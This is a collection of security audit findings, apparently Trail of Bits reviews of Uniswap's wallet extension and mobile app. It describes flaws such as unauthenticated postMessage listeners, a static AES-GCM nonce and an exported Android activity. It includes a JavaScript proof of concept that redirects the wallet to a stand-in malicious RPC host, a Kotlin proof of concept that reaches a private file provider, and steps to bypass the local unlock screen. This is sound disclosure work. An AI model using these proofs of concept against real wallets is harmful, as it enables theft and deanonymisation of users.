interaction. Alternatively, make the wallet request the unlimitedStorage permission or call the navigator.storage.persist methodthese actions should prevent Chrome from clearing the extensions storage.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "31. Password stored in cleartext in session storage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension stores user passwords in session storage. The password is stored in cleartext only when the wallet is unlocked and inaccessible to content scripts. Instead of storing a cleartext password, the extension could store its hashor rather, a key derived from the password with a key derivation function (KDF). This change would bring two benets:  Mitigate password reuse attacks. If the password is stolen and the user uses the same password on multiple systems, the stolen one would allow attackers to compromise other systems. If the password was derived using a KDF, attackers would have to crack the hash rst.  Mitigate timing attacks. It would be harder to disclose information because the attacker would not have full control over the hash. Currently, the code is vulnerable to a timing attack (gure 31.1), though it is probably not exploitable because the password cannot be programmatically controlled. async checkPassword(password: string): Promise<boolean> { const currentPassword = await this.session.getItem(passwordKey) return currentPassword === password } Figure 31.1: Password comparison is not constant time. (universe/packages/wallet/src/ features/wallet/Keyring/Keyring.web.ts#8588) Exploit Scenario Eve steals Alices password from the Uniswap wallet browser extension. Eve uses the password on other systems such as email providers and social networks, compromising many of Alices accounts. Recommendations Short term, make the extension store the key derived from a password, instead of the password itself, in the session storage. Fix the timing attack vulnerability shown in gure 31.1 by replacing the unsafe comparison with a constant-time comparison of derived keys. Unfortunately, Web Crypto does not come with a constant-time comparison algorithm for strings, and JavaScript may optimize-out simple algorithms like an XOR loop (see the References below). However, storing a hash (a derived key) instead of a password and comparing it in non-constant time would be secure enoughan attacker would not have control over the hash and could learn only the rst few characters of it. References  Soatoks Guide to Side-Channel Attacks", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "32. Use of RSA ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension uses the RSA algorithm with OAEP to encrypt mnemonics in the Scantastic protocol. While the RSA-OAEP from Web Crypto should be secure, we recommend not using RSA and instead using modern alternatives like hybrid public key encryption (HPKE) or Elliptic Curve Integrated Encryption Scheme (ECIES). These schemes allow arbitrary-length plaintexts, produce shorter ciphertexts, are less error-prone to implement, and come with interoperable implementations. Recommendations Short term, consider replacing RSA-OAEP with HPKE or ECIES. For example, switch to the Libsodium sealed boxes algorithm. We do not recommend switching to libraries that are not audited or not widely used. Long term, revisit this nding when designing new features that will depend on asymmetric cryptography. References  Seriously, stop using RSA 33. Insu\u0000cient guidance, lack of validation, and unexpected behavior in Scantastic protocol Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-UNIEXT-33 Target: Scantastic protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "34. Local authentication bypass ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The manual modication of the isUnlocked variable in chrome.storage allows bypassing the sidebar's local authentication; however, this behavior does not allow conducting sensitive operations, such as revealing recovery phrases, changing the local password, or adding a wallet. To reproduce the issue, install the Storage Area Explorer Chrome extension, and then follow these steps: 1. Open the Uniswap wallet browser extension and provide the incorrect password (gure 34.1). Figure 34.1: The rst step to bypass local authentication is providing the wrong password. 2. Open Chromes Inspect tool in the sidebar, then go to the \"Storage Explorer tab, and edit the isUnlocked variable to true in the reduxed key (gure 34.2). Figure 34.2: Manual modication of the isUnlocked variable 3. Click Forgot password in the Uniswap browser extension and then enter the recovery phrase. The wallet should be immediately unlocked. Figure 34.3: Unlocked wallet Exploit Scenario A user experiments with the Uniswap wallet browser extension and discovers that modifying a single parameter grants unauthenticated access to his wallet. This compromises the user's condentiality on Uniswap. Recommendations Short term, change the behavior of the wallet to reveal the authenticated view of the wallet only when a user provides the correct password. Long term, periodically test how manual modication of specic parameters in the reduxed key (e.g., using the Storage Area Explorer Chrome extension) aects the wallets behavior.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "35. Chrome storage is not properly cleared after removing a recovery phrase ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "When a user removes the recovery phrase in the Uniswap wallet browser extension, the mnemonic and private keys remain in chrome.storage. To reproduce the issue, initialize a new wallet in the browser extension. Then use the Remove recovery phrase functionality and create a new wallet. After initializing another wallet, use the Storage Area Explorer Chrome extension to see that the com.uniswap.web.mnemonic and com.uniswap.web.privateKey keys of the removed wallet still exist in chrome.storage. Exploit Scenario Convinced of Uniswap softwares condentiality, Bob uses a specic wallet for anonymous transactions. After completing his transactions, he removes the recovery phrase from his wallet, assuming the mnemonic no longer exists in his browser. However, the mnemonic still remains stored in chrome.storage. An attacker, Eve, gains access to Bob's chrome.storage and can easily prove that Bob owned the specic wallet. Recommendations Short term, ensure that the Remove recovery phrase functionality removes the mnemonic and privateKey keys from chrome.storage. Long term, periodically test how specic functionalities in the browser extension aect the wallets chrome.storage (e.g., using the Storage Area Explorer Chrome extension).", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "36. Unisolated components in the setupReduxed conguration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension uses no options when setting up Reduxed Chrome Storage (gure 36.1). The setupReduxed function in the reduxed-chrome-storage library contains the isolated option, and the reduxed-chrome-storage documentation states the following: Check this option if your store in this specic extension component isn't supposed to receive state changes from other extension components. It is recommended to always check this option in Manifest V3 service worker and all extension-related pages (e.g. options page etc.) except popup page. export const reduxedSetupOptions: ReduxedSetupOptions = {} Figure 36.1: Options passed when setting up Reduxed Chrome Storage (universe/apps/stretch/src/background/store.ts#27) Recommendations Short term, consider enabling the isolated option to ensure no other extension components will unpredictably aect the current store in case of further extension development.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "19. Missing message authentication in content script ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Ethereum API creates two event listeners: one in the initExtensionToDappOneWayListener function and one in the sendRequestAsync function. Neither listener validates the events source. A malicious dapp can post a message to a website with a dierent origin and the message will be accepted. private initExtensionToDappOneWayListener = (): void => { const handleDappRequest = async (event: MessageEvent<BaseExtensionRequest>): Promise<void> => { const messageData = event.data {...omitted for brevity...} } // This listener isn't removed because it's needed for the lifetime of the app // TODO: Check for active tab when listening to events window.addEventListener('message', handleDappRequest) } Figure 19.1: The initExtensionToDappOneWayListener function does not authenticate the source of the event. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#123144) function sendRequestAsync<T extends BaseDappResponse>( request: BaseDappRequest, responseType: T['type'], timeoutMs = ONE_HOUR_MS ): Promise<T | ErrorResponse> { return new Promise((resolve, reject) => { {...omitted for brevity...} const handleDappRequest = (event: MessageEvent<any>): void => { const messageData = event.data if ( messageData?.requestId === request.requestId && isValidMessage<T | ErrorResponse>( [responseType, DappResponseType.ErrorResponse], messageData ) ) { {...omitted for brevity...} } } window.addEventListener('message', handleDappRequest) {...omitted for brevity...} }) } Figure 19.2: The sendRequestAsync function does not authenticate the source of the event; it checks only the requestId, which can be guessed or snied by malicious websites. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#563595) Exploit Scenario Alice opens a malicious website and clicks a button. The website opens a new window with the Uniswap application. The website then sends a SwitchChain message to Uniswap. The message contains a URL for a malicious JSON RPC provider. Uniswaps Ethereum API accepts the message and changes the RPC provider. Alice uses the Uniswap website with the attacker-controlled JSON RPC provider. The website displays Alice's data incorrectly. Moreover, the attacker knows Alices IP address and wallet address and can de-anonymize her. The exploit proof of concept is shown in gure 19.3. <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <title>Uniswap extension - TOB-UNIEXT-16</title> </head> <body> <div id=\"button\">Button</div> <div id=\"result\">result</div> <style type=\"text/css\"> #button { height: 200px; width: 200px; border: 1px solid red; } </style> <script type=\"text/javascript\"> let new_window = null; button.onclick = async () => { (async () => { try { await poc(); } catch(err) { console.error(err); } })() }; async function poc() { try { console.log('Start TOB-UNIEXT-16 PoC'); new_window = open('https://app.uniswap.org/') await new Promise(r => setTimeout(r, 4000)); console.log('Sending msg'); new_window.postMessage({'type': 'SwitchChain', 'chainId': -1, 'providerUrl': {'url': 'https://malicious-infura.example.com'} }, '*'); // wait for requests or manually execute code below in the new window // window.ethereum.request({'method': 'eth_blockNumber'}); } catch (err) { console.error(err); } } </script> </body> </html> Figure 19.3: Proof-of-concept exploit Recommendations Short term, add the missing events source authentication to the initExtensionToDappOneWayListener and sendRequestAsync functions to ensure that event.source === window before the functions process any messages. If the listeners described in the nding should handle messages only from the extension and should not handle requests from the website, then use the Chrome messaging API (chrome.runtime.onMessage.addListener) instead of the events API (window.addEventListener). This change would require implementing the recommendations from TOB-UNIEXT-16. Long term, document authentication and data validation requirements for all message- passing logic in the extension.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "20. Data displayed for user conrmation may di\u0000er from actually signed data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension changes transaction details after user conrmation. The extension calls the populateTransaction method, which receives data from a remote server (provider) and updates the transaction with that data. Users cannot manually validate and conrm the updated transaction before signing. The issue occurs in functionalities that use the signAndSendTransaction method but may also exist in other functionalities. const hexRequest = hexlifyTransaction(request) const populatedRequest = await connectedSigner.populateTransaction(hexRequest) const signedTx = await connectedSigner.signTransaction(populatedRequest) const transactionResponse = await provider.sendTransaction(signedTx) Figure 20.1: Part of the signAndSendTransaction method (universe/packages/wallet/ src/features/transactions/sendTransactionSaga.ts#7881) Transaction data populated by the populateTransaction method includes the following:  Transactions destination address translated from an ENS name  Gas price  Gas limit  Max fee per gas  Nonce Exploit Scenario Alice creates a transaction with the Uniswap wallet. She species the destination as the vitalik.eth ENS name. She reviews the transaction in the wallets sidebar and conrms it. The wallet resolves the ENS name with the Infura provider. The provider was recently breached and maliciously resolves the name to the attackers address. Alice unwillingly sends tokens to the attacker. Recommendations Short term, modify the code to display populated transactions to users in the extensions sidebar before asking them for conrmation. Users should be able to see exactly what the wallet will sign after their conrmation. Because the transaction details may need frequent updates, the wallet may need to periodically pull fresh data until the users conrmation. The sidebar should block the conrmation button for a few seconds after every transaction update. Long term, hard code baseline data for gas and fees and warn users if the remote data is distant from this baseline. This recommendation will help users detect malfunctioning providers.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "32. Use of RSA ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension uses the RSA algorithm with OAEP to encrypt mnemonics in the Scantastic protocol. While the RSA-OAEP from Web Crypto should be secure, we recommend not using RSA and instead using modern alternatives like hybrid public key encryption (HPKE) or Elliptic Curve Integrated Encryption Scheme (ECIES). These schemes allow arbitrary-length plaintexts, produce shorter ciphertexts, are less error-prone to implement, and come with interoperable implementations. Recommendations Short term, consider replacing RSA-OAEP with HPKE or ECIES. For example, switch to the Libsodium sealed boxes algorithm. We do not recommend switching to libraries that are not audited or not widely used. Long term, revisit this nding when designing new features that will depend on asymmetric cryptography. References  Seriously, stop using RSA", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "33. Insu\u0000cient guidance, lack of validation, and unexpected behavior in Scantastic protocol ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "We identied four minor issues in the Scantastic protocol related to insucient user instructions, lack of validation of keys, and unexpected behavior in the protocols general ow that could lead to user confusion and enable various phishing attacks. We recommend the following xes to mitigate these issues:", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "34. Local authentication bypass ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The manual modication of the isUnlocked variable in chrome.storage allows bypassing the sidebar's local authentication; however, this behavior does not allow conducting sensitive operations, such as revealing recovery phrases, changing the local password, or adding a wallet. To reproduce the issue, install the Storage Area Explorer Chrome extension, and then follow these steps:", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "37. Lack of global error listener ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension congures the global change listener but does not congure the global error listener (gure 37.1). const listeners: ReduxedSetupListeners = { onGlobalChange: globalChangeListener, } const instantiateStore = setupReduxed(storeCreatorContainer, reduxedSetupOptions, listeners) Figure 37.1: The Reduxed Chrome Storage setup with listeners (universe/apps/stretch/src/background/index.ts#4751) However, the reduxed-chrome-storage library allows specifying an error listener that will run a function whenever an error occurs during the chrome.storage update. Recommendations Short term, implement the error listener to ensure the wallet will behave predictably when an error occurs during the chrome.storage update. A function in the error listener should inform a user to take appropriate steps to resolve an issue with the local storage (e.g., to back up their passphrase and reinstall the browser extension). A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Use of improperly pinned GitHub Actions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The GitHub Actions workows use several third-party actions pinned to a tag or branch name instead of a full commit SHA. This conguration enables repository owners to silently modify the actions. A malicious actor could use this ability to tamper with an application release or leak secrets. 17 18 // (...) 61 - name: Build dev folder uses: borales/actions-yarn@v4 --clientSecret ${{ secrets.CI_GOOGLE_CLIENT_SECRET }} Figure 1.1: The borales/actions-yarn action pinned only to a tag ([redacted]) 27 28 29 30 - name: Create Pull Request uses: peter-evans/create-pull-request@v3 with: token: ${{ secrets.SERVICE_ACCOUNT_PAT }} Figure 1.2: The peter-evans/create-pull-request action pinned only to a tag ([redacted]) 44 45 46 uses: peter-evans/create-pull-request@v3 with: token: ${{ secrets.SERVICE_ACCOUNT_PAT }} Figure 1.3: The peter-evans/create-pull-request action pinned only to a tag ([redacted]) Exploit Scenario An attacker gains unauthorized access to the account of a GitHub Actions owner. The attacker manipulates the actions code to secretly insert a backdoor. As a result, the hidden code is subsequently injected into the nal version of the product, which remains undetected by the end users. Recommendations Short term, pin each third-party action to a specic full-length commit SHA, as recommended by GitHub.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Password policy issues on wallet backup with Google Drive ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "When a user is creating a wallet with a backup using Google Drive, the Uniswap application requires that the password be at least eight characters long. This is a secure requirement; however, the application does not verify (or at least warn users about using) passwords that are low entropy or are composed of a small set of characters (e.g., aaaaaaaa). Also, rampant password reuse would trivialize the eort required to decrypt wallets in the event of a back-end breach. Recent research indicates that 62% of users reuse passwords across multiple sites. Many of those reused passwords are likely to have been leaked by unrelated hacks, allowing credential stuers to purchase those credentials and theoretically decrypt wallets at little expense. Exploit Scenario A victim sets up a wallet using the backup Google Drive and password 12345678. The attacker gets unauthorized access to the victims Google Drive and then can easily decrypt the Uniswap wallet using a common password wordlist, which leads to stolen funds. Recommendations Short term, consider using specic properties for password elds that will allow an OS to auto-generate strong passwords. From a UI perspective, implement a password strength meter to help users set a stronger password. Long term, implement the Have I Been Pwned (HIBP) API in the wallet to check user passwords against publicly known passwords. If a password chosen by a user has been compromised, the wallet should inform the user and require the user to choose a new one.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Innite errors loop when the QR code is invalid ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "Upon scanning a QR code encoded with data that is inconsistent with the set logic for the Uniswap mobile applicationsuch as having an invalid URI (gure 3.1)the application responds with an error message (gure 3.2). The try again feature does not work as intended, so it is not possible to turn o this error message. As a result, the user is left with no option but to restart the application. Figure 3.1: Example QR code with the encoded && 1=1/* string Figure 3.2: Error message upon scanning an invalid QR code Recommendations Short term, x the application so that it handles the error correctly. The try again button should allow a user to scan a QR code again. Long term, extend the testing suite with the collection of potentially invalid or malicious QR codes. References  MalQR: A collection of malicious QR codes and barcodes", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Static AES-GCM nonce used for cloud backup encryption ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The cloud backup feature of the Uniswap mobile wallet allows users to store encrypted mnemonics in the Google Drive application data folder. AES-GCM cipher mode is used for the encryption. The mode requires a unique, random nonce for every encryption operation. However, the Uniswap mobile wallet uses a constant nonce of 16 zeros. The vulnerable nonce generation is highlighted in gure 4.1. fun encrypt(secret: String, password: String, salt: String): String { val key = keyFromPassword(password, salt) val cipher = Cipher.getInstance(\"AES/GCM/NoPadding\") cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, \"AES\"), IvParameterSpec(ByteArray(16))) val encrypted = cipher.doFinal(secret.toByteArray(Charsets.UTF_8)) return Base64.encodeToString(encrypted, Base64.DEFAULT) } Figure 4.1: AES-GCM encryption called by the backupMnemonicToCloudStorage function ([redacted]) While using constant nonces with AES-GCM is usually a critical vulnerability, the impact of the bug is reduced in the context of the Uniswap mobile wallet because the encryption key changes before every encryption. The key is derived from a password and a random salt, as shown in gures 4.1 and 4.2. val encryptionSalt = generateSalt(16) val encryptedMnemonic = withContext(Dispatchers.IO) { encrypt(mnemonic, password, encryptionSalt) } Figure 4.2: Part of the backupMnemonicToCloudStorage function ([redacted]) If the encryption key had been reused, the following attacks would be possible:  Authentication key recovery: The sub-key of the encryption key used for ciphertext authentication could be recovered from a few ciphertexts. This would allow an attacker to modify ciphertext in a meaningful way and recompute a valid authentication tag for the new version.  Reuse of keystream: The XOR of two ciphertexts would result in the XOR of two plaintexts. Given such data, an attacker could perform statistical analysis to recover both plaintexts. Exploit Scenario 1 In future releases of the Uniswap mobile wallet, the random salt is reused in a few subsequent encryptions. Users upload their mnemonics encrypted with a key that is the same for a few ciphertexts. The encrypted mnemonics are stolen from Google Drive and XORed pairwise. The criminals perform statistical analysis and obtain mnemonics in plaintext. They steal all users tokens. Exploit Scenario 2 Users reverse-engineer the Uniswap mobile wallet and learn that a constant nonce is used for AES-GCM encryption of backups. They publicly discuss this information on X (Twitter). Uniswaps credibility is negatively impacted. Recommendations Short term, replace the constant 16-byte nonce with a randomly generated, unique nonce in the encrypt function. Consider using nonces that are 12 bytes long instead of 16 bytes, as this length is more standard. Ensure that a strong, cryptographically secure pseudorandom number generator is used. Long term, create an inventory of ciphers and cryptographic parameters used in the Uniswap mobile wallet. An inventory could easily catch vulnerabilities like weak parameters or incorrect generation of certain cryptographic data. The inventory must be kept up-to-date to be useful, so an internal process should be created for that task. For example, any pull request changing cryptographic code should include an update to the inventory. Moreover, the inventory should be periodically compared to the current cryptographic standards. References  Antoine Joux, Authentication Failures in NIST version of GCM 5. Argon2i algorithm is used instead of Argon2id Severity: Low Diculty: High Type: Cryptography Finding ID: TOB-UNIMOB2-5 Target: Uniswap Android application, cloud backups", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "6. Errors from cryptographic operations contain too much information ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap mobile wallet should limit the amount of information about cryptographic failures. Providing too much detail on failures may allow attackers to extract valuable information about plaintexts and to, for example, mount a padding oracle attack. While we have not observed any exploitable vulnerability in the wallet, the restoreMnemonicFromCloudStorage function, which decrypts AES-GCM encrypted cloud backups, is too verbose. The function returns three dierent errors, depending on the type of exception returned from the decrypting routine. try { decryptedMnemonics = withContext(Dispatchers.IO) { decrypt(encryptedMnemonic, password, encryptionSalt) } } catch (e: BadPaddingException) { Log.e(\"EXCEPTION\", \"${e.message}\") promise.reject( CloudBackupError.BACKUP_INCORRECT_PASSWORD_ERROR.value, \"Incorrect decryption password\" ) } catch (e: IllegalBlockSizeException) { Log.e(\"EXCEPTION\", \"${e.message}\") promise.reject( CloudBackupError.BACKUP_DECRYPTION_ERROR.value, \"Incorrect decryption password\" ) } catch (e: Exception) { Log.e(\"EXCEPTION\", \"${e.message}\") promise.reject( CloudBackupError.BACKUP_DECRYPTION_ERROR.value, \"Failed to decrypt mnemonics\" ) } Figure 6.1: Various errors returned by the restoreMnemonicFromCloudStorage function ([redacted]) Recommendations Short term, have the restoreMnemonicFromCloudStorage function handle all cryptographic errors uniformly. Long term, do a manual review to ensure that the application does not leak information via verbose cryptographic errors. Create a peer review policy that will ask reviewers to catch too verbose cryptographic errors. References  CVE-2019-1559: An example vulnerability whose root cause was that the vulnerable application responded dierently to various decryption errors", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Device-to-device backups are not disabled ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap mobile wallet does not disable local device-to-device transfers. Encrypted shared preferences may be shared with other devices. While the wallet disables backups to Google Drive with the allowBackup ag, the newer Android version (Android 12/API level 31 and higher) does not disable device-to-device transfers with this ag. Exploit Scenario 1 An adversary gains temporary physical access to a phone. He initiates a device-to-device transfer and copies the Uniswap mobile wallets encrypted shared preferences to his device. Then he puts the phone back in place so the victim does not notice the incident. The adversary performs an oine brute-force attack and obtains the users private keys. Exploit Scenario 2 A user copies all his data to a new device with a local device-to-device transfer. The old Uniswap mobile wallets encrypted shared preferences are transferred. The user installs the wallet on the new phone. The wallet application fails to start because it cannot decrypt the copied shared preferences, as the encryption master key stored in the devices Key Store is new. The user gets angry, and Uniswaps reputation is damaged. Recommendations Short term, disable device-to-device transfers. To do this, add the android:dataExtractionRules ag to the Android Manifest pointing to a le with a <device-transfer> section. Add the android:fullBackupContent ag to support older API levels. Long term, follow new features of Android and make sure that the Uniswap wallet application deals with them correctly.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. Overly broad permission requests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The application requests the android.permission.SYSTEM_ALERT_WINDOW permission (gure 8.1), which appears to be broader than warranted by the respective functionalities of the application. The SYSTEM_ALERT_WINDOW permission is of concern because it has often been exploited; it enables an application to display over any other application without notifying the user, such as fraudulent ads or persistent screens. The Android documentation states, Very few apps should use this permission; these windows are intended for system-level interaction with the user. Furthermore, if the application targets API level 23 or higher, the user must explicitly grant this permission to the application through a permission management screen. <uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/> Figure 8.1: The AndroidManifest.xml le in the Uniswap production release APK Exploit Scenario An attacker nds a way to use the SYSTEM_ALERT_WINDOW permission and prepares a tapjacking exploit. The attacker crafts a deceptive overlay on the users device that tricks the user into thinking they are interacting with a legitimate function of the application. The user unknowingly triggers the action to send funds under the attackers control. This results in the theft of the users funds. Recommendations Short term, remove the SYSTEM_ALERT_WINDOW permission. Long term, review the permissions required by the wallet and remove any permissions that the application does not need. Make an inventory of the required permissions with explanations of why they are needed.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "9. Transaction amounts are obscured and lazily validated in initial views ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The initial view (screen) of a new transaction and swap enables users to manually provide an amount to transfer. The amount is validated and cached if validation succeeds. The cached amount is used by the application even if the amount is changed to an arbitrary string (even an invalid one). This issue may allow adversaries to trick users into sending other amounts of tokens than the users wanted to send. On the left of gure 9.1 is the initial view of a transaction where the number 2 was typed and later replaced with 1 whitespaces are not visible. The user sees the converted USD value for the correct number 2. Also, the user is shown the number 2 in the review transaction screen in the following gure. 2. The user sees only the number 1, as Figure 9.1: Two screenshots, the initial view and the review transaction screen Exploit Scenario Alice tricks Bob into copy-pasting an amount string with whitespaces to a transaction screen. Bob sees a small amount that he is willing to transfer to Alice and fails to validate the converted USD amount, which does not match the small amount. Bob also fails to validate the amount on the next screen and signs the transaction with a large amount of tokens. Recommendations Short term, validate amount strings after any changes and do not allow users to proceed with a transaction if the amount string is not valid. That is, instead of caching the last valid amount, always use the string that the user is shown on the screen. Long term, ensure that on all screens with external data, the data shown to the user is exactly the same as that used by the application. In other words, what the user sees is what the application uses. Take special care with whitespaces, special characters, and UTF-8 encoded strings.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Potentially insecure exported NoticationOpenedReceiver activity ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The com.onesignal.NotificationOpenedReceiver activity in Uniswaps Android mobile wallet is exported (gure 10.1) and could allow access to internal components of the Uniswap mobile wallet. For example, the exported NotificationOpenedReceiver activity can behave as a proxy for the unexported content providers. <activity android:theme=\"@android:style/Theme.Translucent.NoTitleBar\" android:name=\"com.onesignal.NotificationOpenedReceiver\" android:exported=\"true\" android:taskAffinity=\"\" android:excludeFromRecents=\"true\" android:noHistory=\"true\"/> Figure 10.1: The exported activity in the AndroidManifest.xml le The following proof-of-concept application (gure 8.2) calls the exported com.onesignal.NotificationOpenedReceiver activity. It then tries to access the unexported com.uniswap.FileSystemFileProvider provider because the provider has granted URI permissions (gure 8.3), so it is possible to use the content:// URI scheme (gure 8.2, line 26). Even though we were unable to steal any Uniswap mobile wallet internal les during the audit, it proves that they are reachable from the perspective of a malicious application on the same device. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package com.example.myexploit import android.content.Intent import android.os.Bundle import androidx.activity.ComponentActivity const val BUNDLE_KEY_ACTION_ID = \"actionId\" const val BUNDLE_KEY_ANDROID_NOTIFICATION_ID = \"androidNotificationId\" const val BUNDLE_KEY_ONESIGNAL_DATA = \"onesignalData\" class MainActivity : ComponentActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) val intent = Intent(\"android.intent.action.VIEW\") intent.setClassName( \"com.uniswap\", \"com.onesignal.NotificationOpenedReceiver\" ) intent.putExtra(BUNDLE_KEY_ACTION_ID, 123) 20 21 22 23 24 25 26 intent.putExtra(\"summary\", \"abc\") intent.putExtra(BUNDLE_KEY_ANDROID_NOTIFICATION_ID, 1337111) intent.putExtra(\"action_button\", false) intent.putExtra(\"dismissed\", false) intent.putExtra(\"grp\", \"whatever\") val myString = \"{ \\\"alert\\\": \\\"Test Msg\\\", \\\"custom\\\": { \\\"i\\\": \\\"UUID\\\", \\\"u\\\": \\\"content://com.uniswap.FileSystemFileProvider/expo_files/\\\" } }\" intent.putExtra(BUNDLE_KEY_ONESIGNAL_DATA, myString) startActivity(intent) 27 28 29 30 } } Figure 10.2: A proof of concept that uses the exported activity and unexported le system provider <provider android:name=\"expo.modules.filesystem.FileSystemFileProvider\" android:exported=\"false\" android:authorities=\"com.uniswap.FileSystemFileProvider\" android:grantUriPermissions=\"true\"> Figure 10.3: The unexported provider with the URI permissions granted The issue was discussed in a OneSignal GitHub issue when the NotificationOpenedReceiver was a broadcast receiver. The OneSignal developer responded that the NotificationOpenedReceiver becomes an activity and is unexported, but it became silently exported in commit 560203a. The issue is of informational severity because we were not able to exploit this vulnerability during the audit, and our attempts indicate that there is no current threat to the Uniswap wallet from this issue. Exploit Scenario A victim installs a malicious application on his device. The malicious application uses the exported activity to steal sensitive les from the victims Uniswap mobile wallet, which allows the attacker to steal the victim's funds. Recommendations Short term, contact upstream library maintainers to resolve the issue or revise the necessity of using this exported activity. Keep in mind that removing the exported=true ag from the com.onesignal.NotificationOpenedReceiver activity in the AndroidManifest.xml le could break functionality.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. Lack of certicate pinning for connections to the Uniswap server ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap mobile wallet does not use certicate pinning to require HTTPS connections to the Uniswap server to use a specic and trusted certicate or to be signed by a specic certicate authority (CA). Certicate pinning is a method of allowing a specic server certicate or public key within an application to reduce the impact of person-in-the-middle (PITM) attacks. When making a connection to the back-end server, if the certicate presented by the server does not match the signature of the pinned certicate, the application should reject the connection. The more general approach for certicate pinning is to limit the set of trusted CAs to only those that are actually used by a system. The issue is of high diculty because a successful attack requires installing a new CA on a target device or compromising one of the CAs trusted by the device. A CA compromise would be a security incident impacting the whole internet, and the chance that adversaries would target the Uniswap wallet is small. Moreover, modern mobile operating systems have mitigations for compromised CA incidents. The impact of a successful PITM attack is similar to what would have happened if somebody compromised the Uniswap server, so it is of low severity (from the perspective of the wallet users). Exploit Scenario 1 As part of a high-prole attack, an attacker compromises a CA and issues a malicious but valid SSL certicate for the server. Several trusted CAs have been compromised in the past, as described in this Google Security blog post. Exploit Scenario 2 An attacker tricks a user into installing a CA certicate within their device's trust store. The attacker issues a malicious but valid SSL certicate and performs a PITM attack. Recommendations Short term, implement certicate pinning by embedding the specic certicates. If the server rotates certicates on a regular, short basis, then instead of pinning server certicates, limit the set of trusted CAs to the ones that will be used by the server. Long term, implement unit tests that verify that the application accepts only the pinned certicate. References  OWASP: Certicate and Public Key Pinning Control  TrustKit: Easy SSL pinning validation and reporting for iOS, macOS, tvOS, and watchOS 12. Third-party applications can take and read screenshots of the Android client screen Severity: Medium Diculty: High Type: Data 